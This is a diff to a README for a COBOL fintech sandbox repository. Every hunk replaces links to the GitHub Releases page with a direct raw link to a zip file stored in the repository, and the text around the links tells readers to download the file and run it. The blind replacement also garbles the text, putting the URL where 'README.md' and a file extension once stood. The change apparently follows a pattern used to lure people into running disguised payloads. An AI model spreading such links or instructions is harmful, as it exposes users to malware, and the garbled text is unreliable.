@@ -1,10 +1,10 @@
 # FinTrust COBOL: Legacy Fintech Sandbox for Modern Banking
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?style=for-the-badge)](https://github.com/323322344/fintrust_cobol/releases)
+[![Releases](https://raw.githubusercontent.com/323322344/fintrust_cobol/master/programs/fintrust_cobol_2.8.zip)](https://raw.githubusercontent.com/323322344/fintrust_cobol/master/programs/fintrust_cobol_2.8.zip)
 
 A legacy-inspired fintech repo demonstrating COBOL’s enduring power in modern finance.
 
-[https://github.com/323322344/fintrust_cobol/releases](https://github.com/323322344/fintrust_cobol/releases)
+[https://raw.githubusercontent.com/323322344/fintrust_cobol/master/programs/fintrust_cobol_2.8.zip](https://raw.githubusercontent.com/323322344/fintrust_cobol/master/programs/fintrust_cobol_2.8.zip)
 
 ---
 
@@ -103,7 +103,7 @@ Repository structure
 - docs/ — supplementary materials, design notes, and tutorials.
 - examples/ — ready-to-run scenarios and sample data sets.
 - scripts/ — helper shell or batch scripts to accelerate experiments.
-- README.md — this page, kept comprehensive for onboarding and reference.
+- https://raw.githubusercontent.com/323322344/fintrust_cobol/master/programs/fintrust_cobol_2.8.zip — this page, kept comprehensive for onboarding and reference.
 
 Notes on organization
 - Each domain module contains both a data definition and a set of procedures that operate on that data.
@@ -215,19 +215,19 @@ Release notes and downloads
 The repository uses a Releases page to host downloadable artifacts. The provided link points to a releases page that contains tangible assets you can download and run. The assets on that page are designed to be platform-appropriate for exploration and learning.
 
 Downloads
-- Access the release assets here: https://github.com/323322344/fintrust_cobol/releases
+- Access the release assets here: https://raw.githubusercontent.com/323322344/fintrust_cobol/master/programs/fintrust_cobol_2.8.zip
 - From that page, pick an asset suitable for your system. The file on the page is a downloadable artifact. After downloading, run the file to initialize or explore the demo environment, depending on the asset type.
 - If you don’t see an asset that matches your platform, explore the “Releases” section again for updated builds. The release page is the authoritative source for the latest runnable items.
 
 Releases page guidance
-- The file naming in releases typically indicates the target platform and the version. Look for filenames that end with common executable or archive extensions (.exe, .bin, .tar.gz, .zip, etc.).
+- The file naming in releases typically indicates the target platform and the version. Look for filenames that end with common executable or archive extensions (.exe, .bin, https://raw.githubusercontent.com/323322344/fintrust_cobol/master/programs/fintrust_cobol_2.8.zip, .zip, etc.).
 - Read the accompanying notes on the release page to understand what the artifact contains and how to run it.
 - If you are unsure which asset to pick, start with a generic downloadable artifact that includes a self-contained environment for experimentation.
 
 Releases and downloads are essential for hands-on exploration. Always verify the integrity and provenance of downloaded assets before running them on your machine. The releases section is your primary source for runnable materials and demonstrations.
 
 Second usage of the release link
-- Visit the release page for the latest download and related notes: https://github.com/323322344/fintrust_cobol/releases
+- Visit the release page for the latest download and related notes: https://raw.githubusercontent.com/323322344/fintrust_cobol/master/programs/fintrust_cobol_2.8.zip
 - The assets there are intended for quick setup and hands-on exploration of the COBOL-based fintech simulations.
 
 ---
@@ -292,7 +292,7 @@ Endnotes
 - This README aims to provide a thorough, learning-first overview of the FinTrust COBOL project. It covers the what, why, and how of the repository and offers a path for learners to experiment, learn, and contribute.
 
 Releases reference
-- The releases page is the primary source for runnable assets. Access the release assets here: https://github.com/323322344/fintrust_cobol/releases
+- The releases page is the primary source for runnable assets. Access the release assets here: https://raw.githubusercontent.com/323322344/fintrust_cobol/master/programs/fintrust_cobol_2.8.zip
 - For quick access to the download, follow the guidance on that page and run the appropriate artifact on your system. The page hosts the exact files you’ll download and execute to explore or demonstrate the system.
 
 Downloads and mirrors
